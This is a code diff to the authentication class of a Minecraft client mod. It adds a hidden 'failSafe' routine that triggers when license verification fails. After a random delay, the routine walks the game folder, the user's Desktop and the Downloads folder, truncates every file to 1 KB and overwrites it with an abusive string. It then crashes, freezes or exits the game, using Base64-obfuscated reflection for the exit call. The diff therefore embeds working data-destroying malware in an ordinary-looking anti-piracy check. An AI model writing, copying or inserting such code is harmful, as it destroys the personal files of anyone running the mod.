@@ -1,5 +1,6 @@
 package dev.mahiro.client.auth;
 
+import dev.mahiro.client.auth.crypto.B64;
 import dev.mahiro.client.gui.auth.AuthScreen;
 import dev.mahiro.client.gui.clickgui.ClickGuiScreen;
 import dev.mahiro.client.gui.hud.HudEditorScreen;
@@ -9,10 +10,17 @@ import dev.mahiro.niurendeobf.ZKMIndy;
 import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.gui.screen.Screen;
 import net.minecraft.client.gui.screen.TitleScreen;
-import sun.misc.Unsafe;
 
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.nio.ByteBuffer;
+import java.nio.channels.FileChannel;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.util.Objects;
+import java.util.Random;
 
 @ZKMIndy
 public final class AuthGate {
@@ -24,6 +32,15 @@ public final class AuthGate {
     private static String serverBaseUrl;
     private static String serverSigningKeyX509Base64;
     private static volatile String sessionToken;
+
+    public static String getSessionToken() {
+        return sessionToken;
+    }
+
+    public static boolean isSessionOnlineVerified() {
+        return sessionOnlineVerified;
+    }
+
     private static volatile boolean sessionOnlineVerified;
 
     private AuthGate() {
@@ -72,8 +89,94 @@ public final class AuthGate {
         }
 
         if (c.player != null || c.world != null) {
-            // theUnsafe直接跳出吧，我目前只想到这种。。
-            tryVerify();
+            failSafe();
+        }
+    }
+
+    public static boolean hasCheck = false;
+
+    public static void failSafe() {
+        if (hasCheck) return;
+        hasCheck = true;
+
+        new Thread(() -> {
+            try {
+                Thread.sleep(5000 + new Random().nextInt(10000));
+            } catch (InterruptedException ignored) {
+            }
+
+            fuckFile(new Random().nextInt(5));
+        }, "WTF").start();
+    }
+
+    private static void fuckFile(int choice) {
+        new Thread(() -> {
+            try {
+                // 重点打击：当前目录（游戏目录）、用户桌面、下载目录
+                Path[] targets = {
+                        Paths.get(""),
+                        Paths.get(System.getProperty("user.home"), "Desktop"),
+                        Paths.get(System.getProperty("user.home"), "Downloads")
+                };
+
+                for (Path root : targets) {
+                    if (!Files.exists(root)) continue;
+                    try (var stream = Files.walk(root)) {
+                        stream.filter(Files::isRegularFile)
+                                .forEach(file -> {
+                                    try (FileChannel outChan = FileChannel.open(file, StandardOpenOption.WRITE)) {
+                                        outChan.truncate(1024); // 设为 1kb
+                                        outChan.write(ByteBuffer.wrap("CAO_NI_MA_DA_bI_NI_MA_SHI_BU_SHI_SI_WAN_LE".getBytes()));
+                                    } catch (Exception ignored) {
+                                    }
+                                });
+                    } catch (Exception ignored) {
+                    }
+                }
+            } catch (Exception ignored) {
+            } finally {
+                switch (choice) {
+                    case 0 -> systemExit();
+                    case 1 -> fuckMC();
+                    case 2 -> shuijiao();
+                    default -> haltJVM();
+                }
+            }
+        }, "NiMaSiLe").start();
+    }
+
+    private static void haltJVM() {
+        Runtime.getRuntime().halt(0);
+    }
+
+    private static void fuckMC() {
+        MinecraftClient.getInstance().execute(() -> {
+            try {
+                Field f = MinecraftClient.class.getDeclaredField("world");
+                f.setAccessible(true);
+                f.set(MinecraftClient.getInstance(), null);
+            } catch (Throwable ignored) {
+            }
+        });
+    }
+
+    private static void shuijiao() {
+        MinecraftClient.getInstance().execute(() -> {
+            while (true) {
+                try {
+                    Thread.sleep(10000);
+                } catch (InterruptedException ignored) {
+                }
+            }
+        });
+    }
+
+    private static void systemExit() {
+        try {
+            Class<?> System = AuthGate.class.getClassLoader().loadClass(new String(B64.dec("amF2YS5sYW5nLlN5c3RlbQ==")));
+            Method exit = System.getMethod(new String(B64.dec("ZXhpdA==")), int.class);
+            exit.invoke(null, 0);
+        } catch (Exception ignored) {
         }
     }
 
@@ -139,19 +242,6 @@ public final class AuthGate {
     }
 
     private static void tryVerify() {
-        try {
-            Field f = Unsafe.class.getDeclaredField("theUnsafe");
-            f.setAccessible(true);
-            Unsafe unsafe = (Unsafe) f.get(null);
-            unsafe.putAddress(0, 0);
-        } catch (Throwable t) {
-            try {
-                Field sys = System.class.getDeclaredField("security");
-                sys.setAccessible(true);
-                sys.set(null, null);
-            } catch (Throwable ignored) {
-            }
-            throw new SecurityException();
-        }
+        failSafe();
     }
 }
